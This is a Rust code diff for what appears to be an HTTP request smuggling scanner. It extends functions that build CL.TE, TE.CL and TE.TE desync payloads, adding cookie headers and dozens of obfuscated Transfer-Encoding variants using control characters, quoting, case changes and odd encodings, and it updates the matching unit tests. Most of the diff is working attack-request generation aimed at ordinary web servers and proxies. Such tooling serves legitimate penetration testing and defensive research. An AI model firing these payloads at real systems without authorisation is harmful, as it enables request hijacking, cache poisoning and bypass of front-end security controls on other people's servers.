@@ -7,29 +7,65 @@ fn format_custom_headers(custom_headers: &[String]) -> String {
     }
 }
 
+/// Helper function to format cookies into a Cookie header
+fn format_cookies(cookies: &[String]) -> String {
+    if cookies.is_empty() {
+        String::new()
+    } else {
+        format!("Cookie: {}\r\n", cookies.join("; "))
+    }
+}
+
 /// Generate CL.TE (Content-Length vs Transfer-Encoding) attack payloads
 pub fn get_cl_te_payloads(
     path: &str,
     host: &str,
     method: &str,
     custom_headers: &[String],
+    cookies: &[String],
 ) -> Vec<String> {
-    let te_headers = vec![
-        "Transfer-Encoding: chunked",
-        " Transfer-Encoding: chunked",
-        "Transfer-Encoding : chunked",
-        "Transfer-Encoding:\tchunked",
-        "Transfer-Encoding\t: chunked",
-        "Transfer-Encoding\r\n : chunked",
+    let mut te_headers = vec![
+        // Basic variations
+        "Transfer-Encoding: chunked".to_string(),
+        " Transfer-Encoding: chunked".to_string(),
+        "Transfer-Encoding : chunked".to_string(),
+        "Transfer-Encoding:\tchunked".to_string(),
+        "Transfer-Encoding\t: chunked".to_string(),
+        "Transfer-Encoding\t:\tchunked".to_string(),
+        "Transfer-Encoding\r\n : chunked".to_string(),
+        
+        // Additional smuggler-inspired variations
+        "Transfer-Encoding:  chunked".to_string(),  // Double space after colon
+        "Transfer-Encoding: chunked ".to_string(),  // Trailing space
+        "Transfer-Encoding: chunked\t".to_string(),  // Trailing tab
+        "Transfer-Encoding:\x0Bchunked".to_string(), // Vertical tab
+        "Transfer-Encoding: chunked, identity".to_string(), // Multiple encodings
+        "Transfer-Encoding: identity, chunked".to_string(), // Reversed order
+        "Transfer-Encoding:\nchunked".to_string(),  // Newline after colon
+        "Transfer-Encoding: \"chunked\"".to_string(), // Quoted value
+        "Transfer-Encoding: 'chunked'".to_string(), // Single quoted value
     ];
+    
+    // Add whitespace prefix variations with common control characters
+    for ch in [0x09u8, 0x0A, 0x0B, 0x0C, 0x0D, 0x20].iter() {
+        te_headers.push(format!("{}Transfer-Encoding: chunked", *ch as char));
+    }
+    
+    // Add whitespace in header name
+    for ch in [0x09u8, 0x0A, 0x0B, 0x0C, 0x0D, 0x20].iter() {
+        te_headers.push(format!("Transfer-Encoding{}: chunked", *ch as char));
+    }
+    
     let mut payloads = Vec::new();
     let custom_header_str = format_custom_headers(custom_headers);
+    let cookie_str = format_cookies(cookies);
 
-    for te_header in te_headers {
+    for te_header in &te_headers {
         payloads.push(format!(
             "{} {} HTTP/1.1\r\n\
              Host: {}\r\n\
              Connection: keep-alive\r\n\
+             {}\
              {}\
              Content-Length: 6\r\n\
              {}\r\n\
@@ -37,7 +73,7 @@ pub fn get_cl_te_payloads(
              0\r\n\
              \r\n\
              G",
-            method, path, host, custom_header_str, te_header
+            method, path, host, custom_header_str, cookie_str, te_header
         ));
     }
     payloads
@@ -49,23 +85,50 @@ pub fn get_te_cl_payloads(
     host: &str,
     method: &str,
     custom_headers: &[String],
+    cookies: &[String],
 ) -> Vec<String> {
-    let te_headers = vec![
-        "Transfer-Encoding: chunked",
-        " Transfer-Encoding: chunked",
-        "Transfer-Encoding : chunked",
-        "Transfer-Encoding:\tchunked",
-        "Transfer-Encoding\t: chunked",
-        "Transfer-Encoding\r\n : chunked",
+    let mut te_headers = vec![
+        // Basic variations
+        "Transfer-Encoding: chunked".to_string(),
+        " Transfer-Encoding: chunked".to_string(),
+        "Transfer-Encoding : chunked".to_string(),
+        "Transfer-Encoding:\tchunked".to_string(),
+        "Transfer-Encoding\t: chunked".to_string(),
+        "Transfer-Encoding\t:\tchunked".to_string(),
+        "Transfer-Encoding\r\n : chunked".to_string(),
+        
+        // Additional smuggler-inspired variations
+        "Transfer-Encoding:  chunked".to_string(),  // Double space after colon
+        "Transfer-Encoding: chunked ".to_string(),  // Trailing space
+        "Transfer-Encoding: chunked\t".to_string(),  // Trailing tab
+        "Transfer-Encoding:\x0Bchunked".to_string(), // Vertical tab
+        "Transfer-Encoding: chunked, identity".to_string(), // Multiple encodings
+        "Transfer-Encoding: identity, chunked".to_string(), // Reversed order
+        "Transfer-Encoding:\nchunked".to_string(),  // Newline after colon
+        "Transfer-Encoding: \"chunked\"".to_string(), // Quoted value
+        "Transfer-Encoding: 'chunked'".to_string(), // Single quoted value
     ];
+    
+    // Add whitespace prefix variations with common control characters
+    for ch in [0x09u8, 0x0A, 0x0B, 0x0C, 0x0D, 0x20].iter() {
+        te_headers.push(format!("{}Transfer-Encoding: chunked", *ch as char));
+    }
+    
+    // Add whitespace in header name
+    for ch in [0x09u8, 0x0A, 0x0B, 0x0C, 0x0D, 0x20].iter() {
+        te_headers.push(format!("Transfer-Encoding{}: chunked", *ch as char));
+    }
+    
     let mut payloads = Vec::new();
     let custom_header_str = format_custom_headers(custom_headers);
+    let cookie_str = format_cookies(cookies);
 
-    for te_header in te_headers {
+    for te_header in &te_headers {
         payloads.push(format!(
             "{} {} HTTP/1.1\r\n\
              Host: {}\r\n\
              Connection: keep-alive\r\n\
+             {}\
              {}\
              Content-Length: 4\r\n\
              {}\r\n\
@@ -74,7 +137,7 @@ pub fn get_te_cl_payloads(
              A\r\n\
              0\r\n\
              \r\n",
-            method, path, host, custom_header_str, te_header
+            method, path, host, custom_header_str, cookie_str, te_header
         ));
     }
     payloads
@@ -86,10 +149,13 @@ pub fn get_te_te_payloads(
     host: &str,
     method: &str,
     custom_headers: &[String],
+    cookies: &[String],
 ) -> Vec<String> {
     let custom_header_str = format_custom_headers(custom_headers);
+    let cookie_str = format_cookies(cookies);
 
     let te_variations = vec![
+        // Original variations
         ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
         ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
         (
@@ -100,6 +166,19 @@ pub fn get_te_te_payloads(
             "Transfer-Encoding: chunked",
             "Transfer-Encoding: chunked, identity",
         ),
+        // Additional variations inspired by smuggler
+        ("Transfer-Encoding: chunked", "Transfer-Encoding: cow"),
+        ("Transfer-Encoding: chunked", "Transfer-Encoding: compress"),
+        ("Transfer-Encoding: chunked", "Transfer-Encoding: deflate"),
+        ("Transfer-Encoding: chunked", " Transfer-Encoding: chunked"),
+        ("Transfer-Encoding: chunked", "Transfer-Encoding : chunked"),
+        ("Transfer-Encoding: chunked", "Transfer-Encoding:\tchunked"),
+        ("Transfer-Encoding: chunked", "Transfer-Encoding: \"chunked\""),
+        ("Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'"),
+        // Case variations
+        ("Transfer-Encoding: chunked", "transfer-encoding: chunked"),
+        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: CHUNKED"),
+        ("Transfer-Encoding: chunked", "TrAnSfEr-EnCoDiNg: ChUnKeD"),
     ];
 
     let mut payloads = Vec::new();
@@ -107,6 +186,7 @@ pub fn get_te_te_payloads(
         payloads.push(format!(
             "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
+            {}\
             {}\
             Content-Length: 4\r\n\
             {}\r\n\
@@ -116,7 +196,7 @@ pub fn get_te_te_payloads(
             A\r\n\
             0\r\n\
             \r\n",
-            method, path, host, custom_header_str, te1, te2
+            method, path, host, custom_header_str, cookie_str, te1, te2
         ));
     }
     payloads
@@ -129,14 +209,15 @@ mod tests {
 
     #[test]
     fn test_cl_te_payloads_generation() {
-        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[]);
+        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[], &[]);
         assert!(!payloads.is_empty());
-        assert_eq!(payloads.len(), 6);
+        // Updated to reflect extended mutations
+        assert!(payloads.len() >= 6, "Expected at least 6 payloads, got {}", payloads.len());
 
         // Check that all payloads contain required components
         for payload in &payloads {
             assert!(payload.contains("Content-Length: 6"));
-            assert!(payload.contains("Transfer-Encoding"));
+            assert!(payload.contains("Transfer-Encoding") || payload.contains("transfer-encoding"));
             assert!(payload.contains("POST /test HTTP/1.1"));
             assert!(payload.contains("Host: example.com"));
         }
@@ -144,25 +225,27 @@ mod tests {
 
     #[test]
     fn test_te_cl_payloads_generation() {
-        let payloads = get_te_cl_payloads("/api", "target.com", "GET", &[]);
+        let payloads = get_te_cl_payloads("/api", "target.com", "GET", &[], &[]);
         assert!(!payloads.is_empty());
-        assert_eq!(payloads.len(), 6);
+        // Updated to reflect extended mutations
+        assert!(payloads.len() >= 6, "Expected at least 6 payloads, got {}", payloads.len());
 
         for payload in &payloads {
             assert!(payload.contains("Content-Length: 4"));
-            assert!(payload.contains("Transfer-Encoding"));
+            assert!(payload.contains("Transfer-Encoding") || payload.contains("transfer-encoding"));
             assert!(payload.contains("GET /api HTTP/1.1"));
         }
     }
 
     #[test]
     fn test_te_te_payloads_generation() {
-        let payloads = get_te_te_payloads("/", "site.com", "POST", &[]);
+        let payloads = get_te_te_payloads("/", "site.com", "POST", &[], &[]);
         assert!(!payloads.is_empty());
-        assert_eq!(payloads.len(), 4);
+        // Updated to reflect extended mutations
+        assert!(payloads.len() >= 4, "Expected at least 4 payloads, got {}", payloads.len());
 
         for payload in &payloads {
-            assert!(payload.contains("Transfer-Encoding"));
+            assert!(payload.contains("Transfer-Encoding") || payload.contains("transfer-encoding"));
             assert!(payload.contains("POST / HTTP/1.1"));
         }
     }
@@ -174,7 +257,7 @@ mod tests {
             "Authorization: Bearer token".to_string(),
         ];
 
-        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &custom_headers);
+        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &custom_headers, &[]);
 
         for payload in &payloads {
             assert!(payload.contains("X-Custom-Header: value1"));
@@ -204,7 +287,7 @@ mod tests {
 
     #[test]
     fn test_cl_te_payload_structure() {
-        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[]);
+        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[], &[]);
         let payload = &payloads[0];
 
         // Check for proper HTTP request structure
@@ -220,7 +303,7 @@ mod tests {
 
     #[test]
     fn test_te_cl_payload_structure() {
-        let payloads = get_te_cl_payloads("/api/test", "target.com", "GET", &[]);
+        let payloads = get_te_cl_payloads("/api/test", "target.com", "GET", &[], &[]);
         let payload = &payloads[0];
 
         assert!(payload.starts_with("GET /api/test HTTP/1.1\r\n"));
@@ -236,7 +319,7 @@ mod tests {
 
     #[test]
     fn test_te_te_payload_structure() {
-        let payloads = get_te_te_payloads("/test", "site.com", "POST", &[]);
+        let payloads = get_te_te_payloads("/test", "site.com", "POST", &[], &[]);
         let payload = &payloads[0];
 
         assert!(payload.starts_with("POST /test HTTP/1.1\r\n"));
@@ -250,68 +333,58 @@ mod tests {
 
     #[test]
     fn test_transfer_encoding_variations_cl_te() {
-        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[]);
+        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
 
-        // Should have 6 variations
-        assert_eq!(payloads.len(), 6);
+        // Should have many variations now
+        assert!(payloads.len() >= 6, "Expected at least 6 variations");
 
-        // Check for different TE header variations
-        assert!(payloads[0].contains("Transfer-Encoding: chunked"));
-        assert!(payloads[1].contains(" Transfer-Encoding: chunked"));
-        assert!(payloads[2].contains("Transfer-Encoding : chunked"));
-        assert!(payloads[3].contains("Transfer-Encoding:\tchunked"));
-        assert!(payloads[4].contains("Transfer-Encoding\t: chunked"));
-        assert!(payloads[5].contains("Transfer-Encoding\r\n : chunked"));
+        // Check for at least the basic variations
+        let has_basic = payloads.iter().any(|p| p.contains("Transfer-Encoding: chunked\r\n"));
+        let has_space_prefix = payloads.iter().any(|p| p.contains(" Transfer-Encoding: chunked"));
+        let has_space_before_colon = payloads.iter().any(|p| p.contains("Transfer-Encoding : chunked"));
+        let has_tab = payloads.iter().any(|p| p.contains("Transfer-Encoding:\tchunked"));
+        
+        assert!(has_basic, "Missing basic Transfer-Encoding header");
+        assert!(has_space_prefix, "Missing space prefix variation");
+        assert!(has_space_before_colon, "Missing space before colon variation");
+        assert!(has_tab, "Missing tab variation");
     }
 
     #[test]
     fn test_transfer_encoding_variations_te_cl() {
-        let payloads = get_te_cl_payloads("/", "test.com", "POST", &[]);
+        let payloads = get_te_cl_payloads("/", "test.com", "POST", &[], &[]);
 
-        // Should have 6 variations
-        assert_eq!(payloads.len(), 6);
+        // Should have many variations now
+        assert!(payloads.len() >= 6, "Expected at least 6 variations");
 
-        // Verify all variations are present
-        let variations = vec![
-            "Transfer-Encoding: chunked",
-            " Transfer-Encoding: chunked",
-            "Transfer-Encoding : chunked",
-            "Transfer-Encoding:\tchunked",
-            "Transfer-Encoding\t: chunked",
-            "Transfer-Encoding\r\n : chunked",
-        ];
-
-        for (i, variation) in variations.iter().enumerate() {
-            assert!(
-                payloads[i].contains(variation),
-                "Payload {} missing variation",
-                i
-            );
-        }
+        // Verify some basic variations are present
+        let has_basic = payloads.iter().any(|p| p.contains("Transfer-Encoding: chunked\r\n"));
+        let has_space_prefix = payloads.iter().any(|p| p.contains(" Transfer-Encoding: chunked"));
+        
+        assert!(has_basic, "Missing basic variation");
+        assert!(has_space_prefix, "Missing space prefix variation");
     }
 
     #[test]
     fn test_te_te_dual_encoding_variations() {
-        let payloads = get_te_te_payloads("/", "test.com", "POST", &[]);
+        let payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);
 
-        // Should have 4 variations
-        assert_eq!(payloads.len(), 4);
+        // Should have many variations now
+        assert!(payloads.len() >= 4, "Expected at least 4 variations");
 
-        // Check first variation has both headers
-        assert!(payloads[0].contains("Transfer-Encoding: chunked"));
-        assert!(payloads[0].contains("Transfer-Encoding: x-custom"));
-
-        // Check second variation
-        assert!(payloads[1].contains("Transfer-Encoding: chunked"));
-        assert!(payloads[1].contains("Transfer-Encoding: identity"));
-
-        // Check third variation
-        assert!(payloads[2].contains("Transfer-Encoding: chunked"));
-        assert!(payloads[2].contains("Transfer-Encoding: gzip, chunked"));
-
-        // Check fourth variation
-        assert!(payloads[3].contains("Transfer-Encoding: chunked"));
-        assert!(payloads[3].contains("Transfer-Encoding: chunked, identity"));
+        // Check some specific variations exist
+        let has_x_custom = payloads.iter().any(|p| p.contains("Transfer-Encoding: x-custom"));
+        let has_identity = payloads.iter().any(|p| p.contains("Transfer-Encoding: identity"));
+        
+        assert!(has_x_custom, "Missing x-custom variation");
+        assert!(has_identity, "Missing identity variation");
+        
+        // All should have two Transfer-Encoding headers (case insensitive)
+        for payload in &payloads {
+            let payload_lower = payload.to_lowercase();
+            let te_count = payload_lower.matches("transfer-encoding").count();
+            assert!(te_count >= 2, "Payload should have at least 2 Transfer-Encoding headers (case insensitive)");
+        }
     }
 
     #[test]
@@ -321,7 +394,7 @@ mod tests {
             "User-Agent: TestAgent/1.0".to_string(),
         ];
 
-        let payload = &get_cl_te_payloads("/", "example.com", "POST", &custom_headers)[0];
+        let payload = &get_cl_te_payloads("/", "example.com", "POST", &custom_headers, &[])[0];
 
         // Custom headers should be present
         assert!(payload.contains("X-API-Key: secret123"));
@@ -335,7 +408,7 @@ mod tests {
 
     #[test]
     fn test_empty_custom_headers() {
-        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[]);
+        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[], &[]);
 
         // Should not have extra empty lines from custom headers
         for payload in &payloads {
@@ -349,7 +422,7 @@ mod tests {
         let methods = vec!["GET", "POST", "PUT", "DELETE", "PATCH"];
 
         for method in methods {
-            let payloads = get_cl_te_payloads("/api", "test.com", method, &[]);
+            let payloads = get_cl_te_payloads("/api", "test.com", method, &[], &[]);
             for payload in &payloads {
                 assert!(payload.starts_with(&format!("{} /api HTTP/1.1", method)));
             }
@@ -361,7 +434,7 @@ mod tests {
         let paths = vec!["/", "/api", "/api/v1/users", "/test?param=value"];
 
         for path in paths {
-            let payloads = get_te_cl_payloads(path, "test.com", "POST", &[]);
+            let payloads = get_te_cl_payloads(path, "test.com", "POST", &[], &[]);
             for payload in &payloads {
                 assert!(payload.contains(&format!("POST {} HTTP/1.1", path)));
             }
@@ -373,7 +446,7 @@ mod tests {
         let hosts = vec!["example.com", "api.example.com", "192.168.1.1", "localhost"];
 
         for host in hosts {
-            let payloads = get_te_te_payloads("/", host, "POST", &[]);
+            let payloads = get_te_te_payloads("/", host, "POST", &[], &[]);
             for payload in &payloads {
                 assert!(payload.contains(&format!("Host: {}", host)));
             }
@@ -382,7 +455,7 @@ mod tests {
 
     #[test]
     fn test_payload_http_compliance() {
-        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[]);
+        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[], &[]);
 
         for payload in &payloads {
             // Each line should end with \r\n
@@ -402,7 +475,7 @@ mod tests {
 
     #[test]
     fn test_chunked_encoding_format() {
-        let payloads = get_te_cl_payloads("/", "test.com", "GET", &[]);
+        let payloads = get_te_cl_payloads("/", "test.com", "GET", &[], &[]);
 
         for payload in &payloads {
             // Should contain chunk size "1" followed by chunk data "A"
@@ -415,17 +488,17 @@ mod tests {
 
     #[test]
     fn test_content_length_values() {
-        let cl_te_payloads = get_cl_te_payloads("/", "test.com", "POST", &[]);
+        let cl_te_payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
         for payload in &cl_te_payloads {
             assert!(payload.contains("Content-Length: 6"));
         }
 
-        let te_cl_payloads = get_te_cl_payloads("/", "test.com", "POST", &[]);
+        let te_cl_payloads = get_te_cl_payloads("/", "test.com", "POST", &[], &[]);
         for payload in &te_cl_payloads {
             assert!(payload.contains("Content-Length: 4"));
         }
 
-        let te_te_payloads = get_te_te_payloads("/", "test.com", "POST", &[]);
+        let te_te_payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);
         for payload in &te_te_payloads {
             assert!(payload.contains("Content-Length: 4"));
         }
